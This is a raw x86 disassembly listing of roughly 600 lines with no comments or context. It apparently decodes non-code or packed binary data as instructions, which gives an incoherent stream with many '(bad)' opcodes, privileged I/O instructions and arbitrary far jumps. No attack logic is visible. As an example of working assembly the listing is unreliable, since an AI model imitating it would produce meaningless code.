  443548:	lea    eax,ds:0xc8b0598a
  44354e:	xor    al,0xbf
  443550:	aas    
  443551:	pop    edi
  443552:	pusha  
  443553:	popa   
  443554:	enter  0x6a68,0xd9
  443558:	mov    esp,0x41910f67
  44355d:	add    cl,BYTE PTR [edx-0x2615d843]
  443563:	into   
  443564:	push   esi
  443565:	push   ebx
  443566:	push   ds
  443567:	mov    ebx,0x66243e8d
  44356c:	test   eax,0xca469373
  443571:	adc    BYTE PTR [esi],bl
  443573:	jecxz  0x443551
  443575:	pop    esp
  443576:	sub    DWORD PTR [edi],edx
  443578:	add    eax,0x611b1e76
  44357d:	test   BYTE PTR ds:0x1e90e9a5,cl
  443583:	pop    eax
  443584:	inc    DWORD PTR [ecx]
  443586:	push   ds
  443587:	mov    esp,0x6ba4d9e6
  44358c:	jge    0x443591
  44358e:	pop    ds
  44358f:	popf   
  443590:	sbb    dh,BYTE PTR [edx]
  443592:	cli    
  443593:	jbe    0x443559
  443595:	dec    edi
  443596:	dec    edx
  443597:	aad    0xae
  443599:	push   edx
  44359a:	loope  0x4435ef
  44359c:	gs mov bl,0x5c
  44359f:	dec    BYTE PTR [ecx+0x31001f47]
  4435a5:	das    
  4435a6:	xchg   ebp,eax
  4435a8:	and    al,BYTE PTR [eax]
  4435aa:	mov    WORD PTR [esi+0x13733f61],?
  4435b0:	xchg   edx,ebx
  4435b2:	inc    edx
  4435b3:	iret   
  4435b4:	push   ebp
  4435b5:	popa   
  4435b6:	(bad)  
  4435b7:	xor    DWORD PTR [eax],ebp
  4435b9:	add    DWORD PTR [eax],esp
  4435bb:	mov    bl,0x86
  4435bd:	addr16 loope 0x4435d0
  4435c0:	pusha  
  4435c1:	leave  
  4435c2:	cli    
  4435c3:	inc    esp
  4435c4:	scas   al,BYTE PTR es:[edi]
  4435c5:	pop    es
  4435c6:	sbb    edi,edx
  4435c8:	lds    eax,FWORD PTR [ebp+0x6303a21c]
  4435ce:	shr    esp,1
  4435d0:	hlt    
  4435d1:	pop    ebx
  4435d2:	pop    eax
  4435d3:	sar    ebx,cl
  4435d5:	popf   
  4435d6:	mov    bl,0x94
  4435d8:	ins    BYTE PTR es:[edi],dx
  4435d9:	mov    dl,0x46
  4435db:	add    dh,ch
  4435dd:	add    eax,0xa82fdd30
  4435e2:	push   ebp
  4435e3:	out    dx,al
  4435e4:	jg     0x4435a8
  4435e6:	jle    0x443655
  4435e8:	test   dl,dl
  4435ea:	ret    0x858
  4435ed:	lock push eax
  4435ef:	cli    
  4435f0:	(bad)  
  4435f1:	in     al,dx
  4435f2:	cmp    dl,ah
  4435f4:	sbb    al,0x39
  4435f6:	not    BYTE PTR [ebx]
  4435f8:	nop
  4435f9:	ror    DWORD PTR [esi+0x2],0x88
  4435fd:	ins    BYTE PTR es:[di],dx
  4435ff:	mov    dl,BYTE PTR [edi+0x3e]
  443602:	mov    es,WORD PTR [edx-0x47]
  443605:	add    bh,BYTE PTR [edx]
  443607:	loope  0x4435c9
  443609:	es add al,0xe1
  44360c:	jns    0x4435b7
  44360e:	inc    ebx
  44360f:	mov    cl,0x65
  443611:	jnp    0x443632
  443613:	mov    bh,0x93
  443615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443616:	sbb    eax,0xc005b9ed
  44361b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44361c:	sbb    esp,ebp
  44361e:	push   0x4
  443620:	daa    
  443621:	and    BYTE PTR [eax+0x5d],0x24
  443625:	sar    BYTE PTR [ecx+0x7e],1
  443628:	gs (bad) 
  44362a:	jmp    0x443684
  44362c:	mov    bl,0xed
  44362e:	outs   dx,BYTE PTR ds:[esi]
  44362f:	jmp    0x44367e
  443631:	daa    
  443632:	inc    edx
  443633:	push   esp
  443634:	ret    0x9883
  443637:	out    0x89,al
  443639:	xchg   DWORD PTR [edi+edx*4+0x34],ebp
  44363d:	jb     0x4436a9
  44363f:	add    BYTE PTR [edx],0xde
  443642:	dec    esp
  443643:	aad    0x41
  443645:	aad    0x24
  443647:	mov    WORD PTR [edx-0x4b],gs
  44364a:	hlt    
  44364b:	nop
  44364c:	mov    BYTE PTR [ebx-0x3674d903],al
  443652:	pop    esi
  443653:	cmp    BYTE PTR [ecx],al
  443655:	sub    al,0x72
  443657:	pop    eax
  443658:	aad    0xe9
  44365a:	pusha  
  44365b:	jae    0x4435e4
  44365d:	sbb    ebp,ebx
  44365f:	mov    esi,0x537cfb89
  443664:	fcom   QWORD PTR [esi-0x3f]
  443667:	enter  0x2d6,0x72
  44366b:	pop    ecx
  44366c:	rcl    DWORD PTR [edi-0x42],1
  44366f:	out    0xdc,eax
  443671:	jmp    0xbdabf995
  443676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443677:	lock fadd st(6),st
  44367a:	dec    edx
  44367b:	stos   DWORD PTR es:[edi],eax
  44367c:	pushf  
  44367d:	cmp    ecx,ecx
  44367f:	and    eax,0xd5bc17b6
  443684:	xchg   DWORD PTR [ebx],edx
  443686:	(bad)  
  443687:	dec    DWORD PTR [eax+0x3e11bbc5]
  44368d:	(bad)  
  44368e:	cmp    ebp,0x11
  443691:	adc    eax,0xe207b3f0
  443696:	adc    esp,edx
  443698:	lds    ebx,FWORD PTR [eax+0x718ee653]
  44369e:	or     ecx,0xf709cd32
  4436a4:	call   0x2534:0xc39f7a48
  4436ab:	push   esp
  4436ac:	(bad)  
  4436ae:	mov    ds:0x1fa33825,al
  4436b3:	push   ebp
  4436b4:	inc    edx
  4436b5:	mov    fs,eax
  4436b7:	mov    bl,0x30
  4436b9:	jns    0x44370f
  4436bb:	aam    0x8a
  4436bd:	push   esp
  4436be:	mov    WORD PTR [ecx-0x64c2dd11],?
  4436c4:	repz pop ecx
  4436c6:	std    
  4436c7:	aam    0x79
  4436c9:	int    0x62
  4436cb:	xchg   ebp,eax
  4436cc:	add    al,0x89
  4436ce:	xor    ah,dl
  4436d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4436d1:	xchg   edx,eax
  4436d2:	sub    al,0xce
  4436d4:	jecxz  0x44365f
  4436d6:	jg     0x4436ed
  4436d8:	mov    BYTE PTR [edi+0x1c226ad1],ch
  4436de:	popa   
  4436df:	js     0x4436df
  4436e1:	sub    DWORD PTR [esi-0x20a145a3],ebp
  4436e7:	jne    0x443696
  4436e9:	pop    esp
  4436ea:	fisttp DWORD PTR [eax-0x50]
  4436ed:	mov    ebp,0xce88c98d
  4436f2:	push   ds
  4436f3:	sbb    eax,0xc963f156
  4436f8:	fiadd  WORD PTR [edi+0x56]
  4436fb:	fsub   st,st(4)
  4436fd:	pushf  
  4436fe:	shr    DWORD PTR [esi+0x44d088e1],0x1f
  443705:	ds pop ds
  443707:	loope  0x443729
  443709:	ret    
  44370a:	or     eax,0x24f1bae1
  44370f:	aam    0x99
  443711:	mov    ds:0xc7f37d8d,al
  443716:	mul    BYTE PTR [edx+0x52044f88]
  44371c:	js     0x44377c
  44371e:	inc    edi
  44371f:	jl     0x4436e6
  443721:	add    eax,0xbdfa8a2e
  443726:	xchg   edi,eax
  443727:	inc    ecx
  443728:	sub    al,dh
  44372a:	pusha  
  44372b:	push   edi
  44372c:	jno    0x44378b
  44372e:	jl     0x44374c
  443730:	in     al,dx
  443731:	xchg   ebp,eax
  443732:	fwait
  443733:	mov    ecx,0x8376c961
  443738:	pop    ebx
  443739:	mov    WORD PTR [eax-0x4],fs
  44373c:	shr    esp,1
  44373e:	out    dx,al
  44373f:	jb     0x4436c8
  443741:	xchg   DWORD PTR [ecx+0x60a6b0b4],esp
  443747:	ja     0x443755
  443749:	push   esi
  44374a:	cdq    
  44374b:	aad    0xe0
  44374d:	and    eax,0xdfa6166
  443752:	(bad)  
  443753:	das    
  443754:	mov    DWORD PTR [ebx+0x4bd16121],edi
  44375a:	test   al,0xe5
  44375c:	mov    WORD PTR ds:0x30d1abd1,cs
  443762:	sbb    BYTE PTR [edi+0x54],dl
  443765:	add    ecx,esi
  443767:	inc    eax
  443768:	gs in  eax,dx
  44376a:	pop    edx
  44376b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44376c:	inc    ecx
  44376d:	fstp   DWORD PTR [edi+0x5b488903]
  443773:	jae    0x4437d3
  443775:	lock dec ebp
  443777:	shr    cl,1
  443779:	pushf  
  44377a:	fcom   DWORD PTR [esi]
  44377c:	mov    ebp,0xe96820df
  443781:	xor    edi,DWORD PTR [edi-0x4a]
  443784:	xor    BYTE PTR [edi],0x62
  443787:	pop    ebx
  443788:	mov    al,0xdd
  44378a:	pusha  
  44378b:	mov    al,BYTE PTR [eax+eax*1]
  44378e:	or     edx,esp
  443790:	adc    al,0x88
  443792:	pop    ebx
  443793:	or     eax,DWORD PTR [edi-0x4f]
  443796:	jl     0x4437df
  443798:	sbb    DWORD PTR [ecx+0x6fd863a4],0x61
  44379f:	bound  ecx,QWORD PTR [edx+0x38]
  4437a2:	aaa    
  4437a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4437a4:	inc    esp
  4437a5:	add    bl,BYTE PTR [eax+0x596596a1]
  4437ab:	jge    0x44380e
  4437ad:	test   eax,0x61896d17
  4437b2:	enter  0xd5ec,0xc5
  4437b6:	mov    ecx,0xef622c00
  4437bb:	xlat   BYTE PTR ds:[ebx]
  4437bc:	lea    eax,[ebp-0x38938424]
  4437c2:	xchg   esp,eax
  4437c3:	les    edi,FWORD PTR [ecx+0x26]
  4437c6:	pop    ds
  4437c7:	adc    eax,0x43f20a72
  4437cc:	sub    ebx,DWORD PTR [ebp+0x51]
  4437cf:	repnz inc ecx
  4437d1:	add    ebp,DWORD PTR [eax+0x1b]
  4437d4:	push   edi
  4437d5:	imul   esi,ebp,0xffffffd5
  4437d8:	pop    ecx
  4437d9:	lods   al,BYTE PTR ds:[esi]
  4437da:	sahf   
  4437db:	pop    ss
  4437dc:	iret   
  4437dd:	add    eax,0xff7971e1
  4437e2:	and    al,0x12
  4437e4:	leave  
  4437e5:	mov    es,edi
  4437e7:	test   eax,0x32bed189
  4437ec:	dec    esi
  4437ed:	icebp  
  4437ee:	xor    BYTE PTR [ecx],bh
  4437f0:	hlt    
  4437f1:	pop    ss
  4437f2:	popf   
  4437f3:	scas   eax,DWORD PTR es:[edi]
  4437f4:	gs push esp
  4437f6:	in     al,dx
  4437f7:	adc    DWORD PTR [eax-0xb50ff4f],ecx
  4437fd:	mov    edx,DWORD PTR [edi]
  4437ff:	aam    0xf3
  443801:	sub    al,0xbf
  443803:	xor    eax,0xb5b85733
  443808:	jno    0x44384e
  44380a:	mov    gs,WORD PTR [edx]
  44380c:	mov    ch,0x93
  44380e:	ret    0x811
  443811:	fsubr  DWORD PTR [edi+0x12]
  443814:	push   esp
  443815:	popf   
  443816:	adc    ebp,DWORD PTR [esp+ecx*8+0x70c53fe8]
  44381d:	sub    BYTE PTR [esi-0x65c1fc04],0x95
  443824:	xchg   esi,eax
  443825:	add    eax,0x6426c80b
  44382a:	data16 adc al,0x56
  44382d:	add    esp,DWORD PTR [edx-0xb]
  443830:	int3   
  443831:	inc    edi
  443832:	pop    esi
  443833:	mov    eax,ds:0x8b6541c1
  443838:	pop    edx
  443839:	test   BYTE PTR [ecx],al
  44383b:	and    ch,BYTE PTR [ebp-0x13222d5b]
  443841:	add    ah,dl
  443843:	(bad)  
  443844:	outs   dx,BYTE PTR ds:[esi]
  443845:	arpl   WORD PTR [edx],si
  443847:	pop    ebx
  443848:	or     edi,esi
  44384a:	pusha  
  44384b:	leave  
  44384c:	neg    DWORD PTR [eax-0x7be3d442]
  443852:	fwait
  443853:	aad    0x75
  443855:	sbb    ebx,DWORD PTR [ecx]
  443857:	out    0xe4,al
  443859:	int    0x6e
  44385b:	add    eax,0xf991c78b
  443860:	test   eax,0x3931278d
  443865:	push   ebp
  443866:	test   eax,0x60f1de5f
  44386b:	bound  edi,QWORD PTR [ecx+eax*4-0x21bfb622]
  443872:	pop    ds
  443873:	test   eax,esi
  443875:	test   DWORD PTR [ebp-0x73],edx
  443878:	sahf   
  443879:	xchg   ch,dh
  44387b:	cmc    
  44387c:	dec    edx
  44387d:	add    al,BYTE PTR [eax]
  44387f:	mov    bh,0x4
  443881:	fsubr  QWORD PTR [esi+0x60]
  443884:	or     al,dl
  443886:	pusha  
  443887:	iret   
  443888:	addr16 mov esi,0x4e74d2e7
  44388e:	(bad)  
  44388f:	aam    0xfc
  443891:	loop   0x443848
  443893:	(bad)  
  443894:	fild   DWORD PTR [ecx+ebp*2+0x39]
  443898:	mov    DWORD PTR [ebx+0x31],esi
  44389b:	gs jge 0x443831
  44389e:	popf   
  44389f:	xor    eax,DWORD PTR [eax-0x1a6e83fd]
  4438a5:	push   cs
  4438a6:	dec    edi
  4438a7:	popf   
  4438a8:	or     al,0xd1
  4438aa:	mov    eax,0x60bdf405
  4438af:	cmp    esp,DWORD PTR [eax-0x67d34483]
  4438b5:	outs   dx,DWORD PTR ds:[esi]
  4438b6:	rcr    BYTE PTR [esp+esi*4-0x26d39c69],cl
  4438bd:	jp     0x443865
  4438bf:	scas   eax,DWORD PTR es:[edi]
  4438c0:	jg     0x4438c5
  4438c2:	or     BYTE PTR [esi-0x63],dl
  4438c5:	lahf   
  4438c6:	jecxz  0x4438f4
  4438c8:	(bad)  
  4438c9:	xlat   BYTE PTR ds:[ebx]
  4438ca:	sub    eax,DWORD PTR [ecx+0x45f52360]
  4438d0:	mov    dh,BYTE PTR [ecx+0x30]
  4438d3:	test   eax,0xad40e823
  4438d8:	adc    eax,DWORD PTR [edx]
  4438da:	mov    cs,WORD PTR [eax+eiz*1-0x9540c2a]
  4438e1:	pop    fs
  4438e3:	aad    0x68
  4438e5:	mov    cl,0x4a
  4438e7:	aas    
  4438e8:	jp     0x4438d8
  4438ea:	xchg   edx,eax
  4438eb:	aam    0xe1
  4438ed:	add    eax,0x7027f297
  4438f2:	dec    esi
  4438f3:	xor    DWORD PTR [ecx+0x776942c7],ecx
  4438f9:	ins    BYTE PTR es:[edi],dx
  4438fa:	sar    dh,1
  4438fc:	pop    ebp
  4438fd:	add    ecx,DWORD PTR [edx+0x1c]
  443900:	add    DWORD PTR [edx+0x63],eax
  443903:	mov    WORD PTR [esi],fs
  443905:	jno    0x443925
  443907:	adc    eax,0xcb35a511
  44390c:	xor    edx,DWORD PTR [esi]
  44390e:	mov    esp,0x1f15c043
  443913:	test   DWORD PTR [edx-0x221234b5],ebx
  443919:	mov    BYTE PTR [edi],cl
  44391b:	mov    ds:0x531d2189,eax
  443920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443921:	adc    bl,bl
  443923:	nop
  443924:	fld    DWORD PTR ds:0xfc8816be
  44392a:	test   al,0x66
  44392c:	and    DWORD PTR [esi+0x2ba0997],ebp
  443932:	adc    eax,0x18700d7b
  443937:	(bad)  
  443938:	cmp    al,0x2
  44393a:	jmp    0x55b4:0xfd766f26
  443941:	std    
  443942:	pusha  
  443943:	rol    DWORD PTR [ebx+0xb0c6bd],cl
  443949:	jmp    0xf2d0f1a2
  44394e:	bound  esp,QWORD PTR [esi+0x3e192f49]
  443954:	imul   cx,WORD PTR [edx],0x8949
  443959:	scas   eax,DWORD PTR es:[edi]
  44395a:	jecxz  0x44397c
  44395c:	xor    al,0x43
  44395e:	mov    eax,ds:0x76058d76
  443963:	fwait
  443964:	enter  0xfea5,0xd7
  443968:	dec    eax
  443969:	nop
  44396a:	outs   dx,BYTE PTR ds:[esi]
  44396b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44396c:	adc    BYTE PTR [ecx-0x5a],dl
  44396f:	les    ecx,FWORD PTR [eax-0x1ca09941]
  443975:	add    al,BYTE PTR [ebp+ecx*8+0x24]
  443979:	dec    edx
  44397a:	iret   
  44397b:	xor    BYTE PTR [edx-0x45],dl
  44397e:	pusha  
  44397f:	jno    0x44392c
  443981:	xor    edi,DWORD PTR [ecx-0x3e]
  443984:	or     BYTE PTR [ecx+0x50cad2b1],cl
  44398a:	(bad)  
  44398b:	retf   
  44398c:	cmp    DWORD PTR [edx+0x5ff7470f],edx
  443992:	push   ds
  443993:	inc    ebx
  443994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443995:	dec    eax
  443996:	or     eax,0x4961a0f4
  44399b:	mov    eax,ebx
  44399d:	mov    ds:0xaeeed4df,al
  4439a2:	jns    0x44394c
  4439a4:	or     edx,DWORD PTR [ecx-0x6f8b589a]
  4439aa:	fisttp QWORD PTR [ebx]
  4439ac:	add    esi,DWORD PTR [edx+0xf7ead34]
  4439b2:	jmp    0x443954
  4439b4:	inc    eax
  4439b5:	ret    0x13ac
  4439b8:	mov    bh,0x2
  4439ba:	and    BYTE PTR [ebx],cl
  4439bc:	jle    0x443948
  4439be:	ret    0x8818
  4439c1:	arpl   cx,cx
  4439c3:	pop    esi
  4439c4:	jmp    0xec1c:0x299510f7
  4439cb:	std    
  4439cc:	(bad)  
  4439cd:	mov    DWORD PTR [esi-0x7925664f],esi
  4439d3:	call   0x9630c761
  4439d8:	repnz mov esi,0x330e97b
  4439de:	pusha  
  4439df:	sub    dl,BYTE PTR [esi-0x11769c]
  4439e5:	arpl   WORD PTR [eax+edx*8],cx
  4439e8:	mov    BYTE PTR [ebx+0xb],ah
  4439eb:	xchg   edi,eax
  4439ec:	add    eax,0x63f83504
  4439f1:	add    ch,BYTE PTR [esi*1+0x20abca95]
  4439f8:	jp     0x44398a
  4439fa:	pop    ss
  4439fb:	dec    esi
  4439fc:	mov    bh,bh
  4439fe:	xchg   esp,eax
  4439ff:	in     eax,0xb7
  443a01:	or     ecx,edi
  443a03:	iret   
  443a04:	sub    al,BYTE PTR [ebx]
  443a06:	add    cl,BYTE PTR [ecx]
  443a08:	dec    ebx
  443a09:	loop   0x44399a
  443a0b:	nop
  443a0c:	loop   0x443a45
  443a0e:	pushf  
  443a0f:	inc    edi
  443a10:	pop    ecx
  443a11:	add    bl,BYTE PTR [esi-0x652d50cf]
  443a17:	push   eax
  443a18:	and    eax,0xe86a644
  443a1d:	popfw  
  443a1f:	aam    0x0
  443a21:	je     0x443a90
  443a23:	adc    eax,DWORD PTR [ecx+0x7e9361f6]
  443a29:	mov    bh,0x68
  443a2b:	lds    esp,FWORD PTR [eax-0x598ee8dd]
  443a31:	add    ch,al
  443a33:	jns    0x4439b9
  443a35:	adc    dl,BYTE PTR [ebx+0x39]
  443a38:	cmc    
  443a39:	jge    0x443a12
  443a3b:	or     DWORD PTR [ebp+0x7559081f],ebp
  443a41:	jo     0x443a9d
  443a43:	test   esi,ebx
  443a45:	push   es
  443a46:	sbb    dl,dl
  443a48:	xchg   edx,eax
  443a49:	xor    eax,0x8076a1dc
  443a4e:	adc    BYTE PTR [ecx],ah
  443a50:	xchg   ebp,eax
  443a51:	ds ins DWORD PTR es:[edi],dx
  443a53:	mov    bh,0x34
  443a55:	lea    edx,fs:[edx+ebp*2+0x5f]
  443a5a:	idiv   cl
  443a5c:	rcr    DWORD PTR ds:0x322d943,1
  443a62:	les    esi,FWORD PTR [ebx]
  443a64:	jle    0x443a9b
  443a66:	popf   
  443a67:	jle    0x443a08
  443a69:	dec    edi
  443a6a:	dec    ebp
  443a6b:	in     eax,dx
  443a6c:	sub    dh,BYTE PTR [edx+0x1902d716]
  443a72:	add    eax,0x7f6a0de4
  443a77:	mov    ch,0x88
  443a79:	adc    esp,eax
  443a7b:	jp     0x443a15
  443a7d:	jb     0x443a49
  443a7f:	push   0xffffffe4
  443a81:	dec    ebp
  443a82:	sbb    al,0xfd
  443a84:	leave  
  443a85:	lahf   
  443a86:	fisub  DWORD PTR [ebp+0x16]
  443a89:	in     eax,0x7e
  443a8b:	push   eax
  443a8c:	add    al,0x19
  443a8e:	pop    ds
  443a8f:	and    al,0x46
  443a91:	scas   eax,DWORD PTR es:[edi]
  443a92:	mov    bl,0xcf
  443a94:	mov    DWORD PTR [ebx-0x2698b7fa],ecx
  443a9a:	mov    bh,BYTE PTR [ebp+0x3f1626df]
  443aa0:	xor    dh,al
  443aa2:	pusha  
  443aa3:	or     al,0x44
  443aa5:	sbb    eax,edi
  443aa7:	(bad)  
  443aa8:	mov    BYTE PTR [ebx-0x3b],bl
  443aab:	es and dl,dl
  443aae:	ins    DWORD PTR es:[edi],dx
  443aaf:	adc    bh,dl
  443ab1:	add    eax,0x6a054082
  443ab6:	sbb    ecx,edx
  443ab8:	and    eax,0x1bb31f77
  443abd:	jp     0x443afc
  443abf:	aam    0xbf
  443ac1:	xchg   ebp,eax
  443ac2:	inc    ebp
  443ac3:	repz xchg ecx,eax
  443ac5:	in     eax,dx
  443ac6:	adc    cl,al
  443ac8:	sahf   
  443ac9:	add    al,BYTE PTR [edx-0x76]
  443acc:	sub    DWORD PTR [ebp-0x7a],esp
  443acf:	pop    eax
  443ad0:	imul   edi
  443ad2:	jge    0x443ae5
  443ad4:	test   eax,0x89c88b41
  443ad9:	aad    0xb0
  443adb:	in     eax,dx
  443adc:	dec    esi
  443add:	scas   eax,DWORD PTR es:[edi]
  443ade:	cwde   
  443adf:	xlat   BYTE PTR ds:[ebx]
  443ae0:	in     al,0x47
  443ae2:	inc    edi
  443ae3:	pop    ebp
  443ae4:	push   cs
  443ae5:	fnstenv [edi]
  443ae7:	cmp    al,0xb0
  443ae9:	pop    esp
  443aea:	pop    ds
  443aeb:	add    edi,DWORD PTR [edx-0x4d282e24]
  443af1:	cs or  al,0xef
  443af4:	test   BYTE PTR [ebp+0x67],dh
  443af7:	aad    0xff
  443af9:	pop    ss
  443afa:	je     0x443b1f
  443afc:	pop    esi
  443afd:	shr    DWORD PTR [edx-0x48],1
  443b00:	mov    BYTE PTR [ebx-0x1a2d8a5d],al
  443b06:	les    edi,FWORD PTR [ebp-0x21]
  443b09:	adc    al,0x12
  443b0b:	call   0x6f90:0x528d2e9a
  443b12:	ds jae 0x443b1e
  443b15:	hlt    
  443b16:	inc    esi
  443b17:	retf   
  443b18:	call   0xe0e95920
  443b1d:	mov    esp,0x236e928
  443b22:	sahf   
  443b23:	hlt    
  443b24:	jp     0x443b2a
  443b26:	add    bl,BYTE PTR [ebp-0x64]
  443b29:	sbb    bl,BYTE PTR [esi]
  443b2b:	stc    
  443b2c:	je     0x443b0d
  443b2e:	call   0x6ef0b82
  443b33:	xlat   BYTE PTR ds:[ebx]
  443b34:	addr16 icebp 
  443b36:	or     ch,BYTE PTR [eax-0x65e85c01]
  443b3c:	mov    dh,0x31
  443b3e:	xchg   DWORD PTR [edx+0x2e181601],esp
  443b44:	mov    DWORD PTR [eax+0x2f],eax
  443b47:	mov    esi,0xc28c031c
  443b4c:	loopne 0x443b4b
  443b4e:	(bad)  
  443b4f:	into   
  443b50:	xlat   BYTE PTR ds:[ebx]
  443b51:	push   ecx
  443b52:	adc    DWORD PTR [edx],esi
  443b54:	mov    BYTE PTR [ebx-0x71],ah
  443b57:	sbb    al,0x95
  443b59:	pop    esp
  443b5a:	mov    al,ds:0x5a05aeab
  443b5f:	sbb    DWORD PTR [eiz*1+0x18db803d],ecx
  443b66:	or     ebp,DWORD PTR [ecx+ecx*4+0x273d8cb9]
  443b6d:	mov    ds:0x2dec0968,eax
  443b72:	jle    0x443b2a
  443b74:	sbb    bh,BYTE PTR [edi+edi*4-0x5e]
  443b78:	mov    BYTE PTR [edi-0x10],dh
  443b7b:	mov    esi,0x7f61cfdc
  443b80:	fisttp WORD PTR [ebp-0x34]
  443b83:	and    ebp,DWORD PTR [edx+0x1dd1e3d6]
  443b89:	mov    ds:0x3267bad,al
  443b8e:	or     BYTE PTR [esi-0x47381fd2],dh
  443b94:	addr16 rol edi,cl
  443b97:	(bad)
  443b9b:	inc    ebx
  443b9c:	fsubr  QWORD PTR [esi]
  443b9e:	push   ds
  443b9f:	mov    DWORD PTR [esi+ebp*4],edx
  443ba2:	je     0x443bc6
  443ba4:	es pop esp
  443ba6:	daa    
  443ba7:	aam    0xd2
  443ba9:	in     eax,dx
  443baa:	idiv   DWORD PTR [eax+0x5657c534]
  443bb0:	pop    ebp
  443bb1:	add    eax,0x50468b60
  443bb6:	pop    eax
  443bb7:	jp     0x443c05
  443bb9:	inc    esp
  443bba:	je     0x443b8c
  443bbc:	dec    BYTE PTR [ecx+0x73]
  443bbf:	adc    BYTE PTR [edi+ecx*4],al
  443bc2:	lahf   
  443bc3:	es popf 
  443bc5:	popf   
  443bc6:	jge    0x443ba3
  443bc8:	out    0xc6,eax
  443bca:	or     dl,BYTE PTR [edx+edi*8-0x18]
  443bce:	dec    ebp
  443bcf:	add    al,0xeb
  443bd1:	add    cl,al
  443bd3:	xlat   BYTE PTR gs:[ebx]
  443bd5:	loop   0x443c18
  443bd7:	int    0xfc
  443bd9:	jbe    0x443bdc
  443bdb:	out    0xd4,al
  443bdd:	mov    bh,0xde
  443bdf:	dec    esi
  443be0:	mov    DWORD PTR [ebx],ebp
  443be2:	and    ah,BYTE PTR [ecx-0x28e491ea]
  443be8:	sub    esp,eax
  443bea:	mov    DWORD PTR [edi+0x119b204f],edx
  443bf0:	mov    bh,BYTE PTR [ebp+0x58]
  443bf3:	sbb    eax,0x9cef62a1
  443bf8:	js     0x443bdf
  443bfa:	aaa    
  443bfb:	(bad)  
  443bfc:	pop    edx
  443bfd:	mov    DWORD PTR [esi+esi*8+0x1e],edx
  443c01:	in     eax,dx
  443c02:	and    al,0x48
  443c05:	xlat   BYTE PTR ds:[ebx]
  443c06:	daa    
  443c07:	repz mov ecx,esi
  443c0a:	loope  0x443c24
  443c0c:	(bad)  
  443c0d:	push   ecx
  443c0e:	rol    DWORD PTR ds:0xa388036a,0x3e
  443c15:	jl     0x443c0a
  443c17:	xor    ebp,DWORD PTR [eax]
  443c19:	pop    ecx
  443c1a:	pop    ds
  443c1b:	jmp    0xbc7375da
  443c20:	push   esi
  443c21:	xchg   esp,eax
  443c22:	push   ebp
  443c23:	aad    0x69
  443c25:	jbe    0x443c1f
  443c27:	push   0x29
  443c29:	(bad)  
  443c2a:	ins    DWORD PTR es:[edi],dx
  443c2b:	mov    esp,0x79cfe388
  443c30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443c31:	mov    esp,0x4553d091
  443c36:	mov    al,0x7f
  443c38:	aad    0x85
  443c3a:	or     al,dh
  443c3c:	cdq    
  443c3d:	jg     0x443c90
  443c3f:	inc    esp
  443c40:	mov    ah,0x8b
  443c42:	or     BYTE PTR [ebp+0x512be389],cl
  443c48:	and    ah,ch
  443c4a:	sbb    bh,dl
  443c4c:	inc    eax
  443c4d:	cs mov ecx,0xf0adb45c
  443c53:	mov    esi,DWORD PTR [ebx+ebp*8-0x4a77c52b]
  443c5a:	adc    eax,0xdae0faf0
  443c5f:	aam    0x42
  443c61:	fistp  WORD PTR [ecx]
  443c63:	pop    ss
  443c64:	cwde   
  443c65:	(bad)  
  443c66:	sbb    al,0xa
  443c68:	mov    BYTE PTR [edi+0x3f],bl
  443c6b:	outs   dx,DWORD PTR ds:[esi]
  443c6c:	or     DWORD PTR ds:0x84d75f6e,ebp
  443c72:	std    
  443c73:	ror    BYTE PTR [ecx+0x44119131],cl
  443c79:	ss xchg esi,eax
  443c7b:	jge    0x443c05
  443c7d:	dec    ebx
  443c7e:	clc    
  443c7f:	leave  
  443c80:	cmp    ah,BYTE PTR ds:0x33efa18
  443c86:	sub    bh,bl
  443c88:	jo     0x443ce6
  443c8a:	std    
  443c8b:	sbb    eax,0xcf60209c
  443c90:	add    BYTE PTR [ecx-0x2c],0xc1
  443c94:	mov    edi,0xbacd063c
  443c99:	or     DWORD PTR ds:0x9de993d4,ecx
  443c9f:	mov    dh,0x49
  443ca1:	push   ds
  443ca2:	shr    al,0x89
  443ca5:	test   DWORD PTR [edx-0x293747a4],ebp
  443cab:	cmp    al,0xc8
  443cad:	push   cs
  443cae:	sbb    al,0xd7
  443cb0:	and    al,0x34
  443cb2:	rcl    cl,cl
  443cb4:	ret    
  443cb5:	(bad)  
  443cb6:	mov    ebp,0x2b9d88c2
  443cbb:	dec    ebx
  443cbc:	fwait
  443cbd:	fs push es
  443cbf:	add    DWORD PTR [edi+0x5a850405],0xffffffcf
  443cc6:	lock adc bh,BYTE PTR [edi]
  443cc9:	mov    esp,DWORD PTR [edx+0x2b]
  443ccc:	jmp    0x1888:0x5f864932
  443cd3:	icebp  
  443cd4:	cmc    
  443cd5:	dec    ecx
  443cd6:	mov    eax,0x7f9d69a7
  443cdb:	(bad)  
  443cdc:	jle    0x443d3f
  443cde:	pop    ebp
  443cdf:	outs   dx,BYTE PTR ds:[esi]
  443ce0:	std    
  443ce1:	add    eax,0x435c8125
  443ce6:	pop    edx
  443ce7:	inc    ebp
  443ce8:	pop    ss
  443ce9:	adc    ebx,DWORD PTR [esi]
  443ceb:	dec    esp
  443cec:	dec    ebp
  443ced:	push   eax
  443cee:	cmp    eax,0xbe00d1c5
  443cf3:	cmp    DWORD PTR [edi-0x52569c2],esp
  443cf9:	add    BYTE PTR [eax+ebp*8-0x78],0x4d
  443cfe:	cmp    dh,bh
  443d00:	jl     0x443d80
  443d02:	mov    eax,ds:0x21497ee
  443d07:	sbb    ah,BYTE PTR [edx-0xb]
  443d0a:	jl     0x443d81
  443d0c:	dec    eax
  443d0d:	push   ebp
  443d0e:	into   
  443d0f:	xlat   BYTE PTR ds:[ebx]
  443d10:	clc    
  443d11:	push   0x1dcdd11f
  443d16:	out    dx,al
  443d17:	inc    eax
  443d18:	xchg   edx,eax
  443d19:	in     eax,0x56
  443d1b:	aad    0xbf
  443d1d:	push   es
  443d1e:	repnz aad 0xb4
  443d21:	jge    0x443d32
  443d23:	ss mov edi,ecx
  443d26:	mov    ebp,0xb055fee8
